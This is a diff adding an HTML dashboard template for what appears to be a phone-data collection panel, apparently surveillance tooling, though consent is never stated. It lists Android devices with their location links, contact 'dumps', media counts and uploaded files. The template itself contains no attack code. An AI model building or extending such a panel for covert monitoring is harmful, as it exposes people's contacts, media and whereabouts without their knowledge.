@@ -1,0 +1,165 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
+    <h1 class="h2">Dashboard</h1>
+    <div class="btn-toolbar mb-2 mb-md-0">
+        <div class="btn-group me-2">
+            <button type="button" class="btn btn-sm btn-outline-secondary" onclick="location.reload()">Refresh</button>
+        </div>
+    </div>
+</div>
+
+<!-- Stats Cards -->
+<div class="row mb-4">
+    <div class="col-md-3">
+        <div class="card bg-primary text-white h-100">
+            <div class="card-body">
+                <h5 class="card-title">Total Devices</h5>
+                <h2 class="display-6">{{ stats.device_count }}</h2>
+                <i class="fas fa-mobile-alt stat-icon"></i>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="card bg-success text-white h-100">
+            <div class="card-body">
+                <h5 class="card-title">Contacts Synced</h5>
+                <h2 class="display-6">{{ stats.contacts_total }}</h2>
+                <i class="fas fa-address-book stat-icon"></i>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="card bg-info text-white h-100">
+            <div class="card-body">
+                <h5 class="card-title">Files Uploaded</h5>
+                <h2 class="display-6">{{ stats.uploads_count }}</h2>
+                <i class="fas fa-file-image stat-icon"></i>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="card bg-warning text-dark h-100">
+            <div class="card-body">
+                <h5 class="card-title">Active Today</h5>
+                <h2 class="display-6">{{ stats.active_today }}</h2>
+                <i class="fas fa-clock stat-icon"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Intelligent Suggestions -->
+<div class="row mb-4">
+    <div class="col-12">
+        <div class="card border-info">
+            <div class="card-header bg-info text-white">
+                <i class="fas fa-lightbulb me-2"></i> Intelligent Suggestions & Alerts
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    {% for suggestion in suggestions %}
+                    <div class="col-md-4 mb-2">
+                        <div class="alert alert-{{ suggestion.type }} d-flex align-items-center mb-0" role="alert">
+                            <i class="fas fa-{{ suggestion.icon }} me-2"></i>
+                            <div>
+                                <strong>{{ suggestion.title }}</strong><br>
+                                <small>{{ suggestion.message }}</small>
+                            </div>
+                        </div>
+                    </div>
+                    {% else %}
+                    <div class="col-12 text-muted">No pending suggestions. System is running optimally.</div>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Recent Devices Table -->
+<h3>Recent Device Data</h3>
+<div class="table-responsive mb-4">
+    <table class="table table-hover align-middle">
+        <thead class="table-light">
+            <tr>
+                <th>Device ID</th>
+                <th>Model</th>
+                <th>OS</th>
+                <th>Contacts</th>
+                <th>Media</th>
+                <th>Location</th>
+                <th>Last Seen</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for r in devices %}
+            <tr>
+                <td><span class="badge bg-secondary">{{ r[1][:8] }}...</span></td>
+                <td>{{ r[2] }}</td>
+                <td>Android {{ r[3] }}</td>
+                <td>{{ r[4] }}</td>
+                <td>
+                    <small>
+                        <i class="fas fa-image"></i> {{ r[5] }}
+                        <i class="fas fa-video ms-1"></i> {{ r[6] }}
+                    </small>
+                </td>
+                <td>
+                    {% if r[8] and r[9] %}
+                    <a href="https://www.google.com/maps/search/?api=1&query={{ r[8] }},{{ r[9] }}" target="_blank" class="btn btn-sm btn-outline-primary">
+                        <i class="fas fa-map-marker-alt"></i> View
+                    </a>
+                    {% else %}
+                    <span class="text-muted"><i class="fas fa-ban"></i></span>
+                    {% endif %}
+                </td>
+                <td>{{ r[10].split('T')[0] }} <small class="text-muted">{{ r[10].split('T')[1][:5] }}</small></td>
+                <td>
+                    <a href="/device/{{ r[1] }}" class="btn btn-sm btn-primary">Details</a>
+                </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+
+<div class="row">
+    <div class="col-md-6">
+        <h3>Recent Uploads</h3>
+        <div class="table-responsive">
+            <table class="table table-sm">
+                <thead><tr><th>File</th><th>Device</th><th>Action</th></tr></thead>
+                <tbody>
+                    {% for u in uploads %}
+                    <tr>
+                        <td>{{ u[2] }}</td>
+                        <td><small class="text-muted">{{ u[1][:8] }}...</small></td>
+                        <td><a href="/uploads/{{ u[2] }}" target="_blank" class="btn btn-sm btn-outline-info">Open</a></td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="col-md-6">
+        <h3>Contact Dumps</h3>
+        <div class="table-responsive">
+            <table class="table table-sm">
+                <thead><tr><th>Count</th><th>Device</th><th>Action</th></tr></thead>
+                <tbody>
+                    {% for c in contacts %}
+                    <tr>
+                        <td>{{ c[2] }} items</td>
+                        <td><small class="text-muted">{{ c[1][:8] }}...</small></td>
+                        <td><a href="/contacts/{{ c[0] }}" class="btn btn-sm btn-outline-success">View</a></td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+{% endblock %}
